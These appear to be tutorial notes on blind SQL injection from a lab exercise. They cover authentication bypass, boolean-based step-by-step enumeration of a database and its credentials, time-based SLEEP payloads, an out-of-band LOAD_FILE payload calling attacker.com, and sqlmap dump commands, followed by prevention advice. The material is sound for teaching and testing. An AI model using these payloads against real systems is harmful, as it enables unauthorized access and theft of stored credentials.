
---

**Blind SQL Injection**

Unlike In-Band SQL Injection, where we can see the results of our attack directly on the screen, Blind SQLi is when we get little or no feedback to confirm whether our injected queries were successful or not. This is because error messages have been disabled, but the injection still works regardless. It may surprise you that all we need is a little feedback to successfully enumerate an entire database.

---

**Authentication Bypass:**

One of the most straightforward Blind SQL Injection techniques is bypassing authentication methods such as login forms. In this case, we are not interested in retrieving data from the database — we just want to bypass the login.

Login forms connected to a user database are often developed in a way where the web application doesn't care about the content of the username and password, but rather whether the two form a matching pair in the users table. Essentially, the web application asks the database: *"Do you have a user with username 'bob' and password 'bob123'?"*, and the database responds with yes or no (true/false), and based on this answer, it dictates whether the web application lets you proceed.

With this in mind, it is not necessary to enumerate a valid username/password. We only need to create a database query that answers yes/true.

---

**Practical Example:**

The SQL query being processed looks like this:
```sql
select * from users where username='%username%' and password='%password%' LIMIT 1;
```

To make this query always return true, we can enter the following in the password field:
```sql
' OR 1=1;--
```

Which turns the SQL query into:
```sql
select * from users where username='' and password='' OR 1=1;
```

Since `1=1` is always true and we used the OR operator, this will always return true — satisfying the web application's logic that a valid username/password pair was found and access should be granted.

> ⚠️ **Note:** This is not a game — you must focus and understand what is written carefully.

---

**Boolean-Based Blind SQLi**

Boolean-based SQL Injection refers to the response we receive from our injection attempts, which can be true/false, yes/no, on/off, 1/0 — or any response that can only have two outcomes. This confirms whether our SQL injection payload was successful or not. At first glance, this limited response may not seem to provide much information. However, with just these two responses, it is possible to enumerate the entire database structure and its contents.

---

**Practical Example:**

Given the URL:
```
https://website.thm/checkuser?username=admin
```
The browser returns `{"taken": true}`. This API endpoint simulates a common feature in registration forms that checks if a username is already registered. Since `taken` is true, we can assume the username `admin` is registered.

The SQL query being processed:
```sql
select * from users where username = '%username%' LIMIT 1;
```

**Step 1 — Find the number of columns:**
```sql
admin123' UNION SELECT 1;--         → false (wrong number of columns)
admin123' UNION SELECT 1,2,3;--     → true  (3 columns confirmed ✅)
```

**Step 2 — Find the database name:**
```sql
admin123' UNION SELECT 1,2,3 where database() like '%';--
```
Returns true (wildcard `%` matches anything). Then narrow it down letter by letter:
```sql
admin123' UNION SELECT 1,2,3 where database() like 's%';--   → true ✅
admin123' UNION SELECT 1,2,3 where database() like 'sq%';--  → true ✅
```
Continue until full name is found: **`sqli_three`**

**Step 3 — Find table names:**
```sql
admin123' UNION SELECT 1,2,3 FROM information_schema.tables 
WHERE table_schema = 'sqli_three' and table_name like 'a%';--
```
Cycle through letters until you find: **`users`** table

Confirm with:
```sql
admin123' UNION SELECT 1,2,3 FROM information_schema.tables 
WHERE table_schema = 'sqli_three' and table_name='users';--
```

**Step 4 — Find column names:**
```sql
admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS 
WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';
```
Once you find a column (e.g., `id`), exclude it and continue:
```sql
... and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';
```
Discovered columns: **`id`**, **`username`**, **`password`**

**Step 5 — Find valid username:**
```sql
admin123' UNION SELECT 1,2,3 from users where username like 'a%
```
Result: username = **`admin`** ✅

**Step 6 — Find the password:**
```sql
admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%
```
Result: password = **`3845`** ✅

---

**Additional Details & Tips**

**Other Types of Blind SQLi:**

| Type | How it works |
|---|---|
| **Boolean-Based** | True/false response changes page content |
| **Time-Based** | Use `SLEEP()` to cause delays as confirmation |
| **Out-of-Band** | Force the DB to make DNS/HTTP requests to your server |

**Time-Based Blind SQLi Example:**
```sql
' OR SLEEP(5);--
' AND IF(1=1, SLEEP(5), 0);--
' AND IF(database() LIKE 's%', SLEEP(5), 0);--
```
If the page **delays 5 seconds** → condition is true ✅

**Out-of-Band Example (MySQL):**
```sql
' UNION SELECT LOAD_FILE('\\\\attacker.com\\test');--
```
If you receive a DNS request on your server → confirmed blind SQLi ✅

---

**Automating Blind SQLi with SQLMap:**
Manual enumeration is slow — automate it with SQLMap:
```bash
# Basic detection
sqlmap -u "https://example.com/checkuser?username=admin" --dbs

# Enumerate tables
sqlmap -u "https://example.com/checkuser?username=admin" -D sqli_three --tables

# Dump data
sqlmap -u "https://example.com/checkuser?username=admin" -D sqli_three -T users --dump

# For POST requests
sqlmap -u "https://example.com/login" --data="username=admin&password=test" --dbs

# Using Burp Suite captured request
sqlmap -r request.txt --dbs
```

---

**Prevention:**
- Use **prepared statements** (parameterized queries) — the most effective defense
- Use **stored procedures** safely
- **Whitelist** input validation
- Apply **least privilege** to database accounts
- Disable **detailed error messages** in production
- Use a **Web Application Firewall (WAF)**

---

**Bug Bounty Severity:**
Blind SQLi → **Critical** 🔴 — can lead to full database dump, authentication bypass, and in some cases remote code execution!
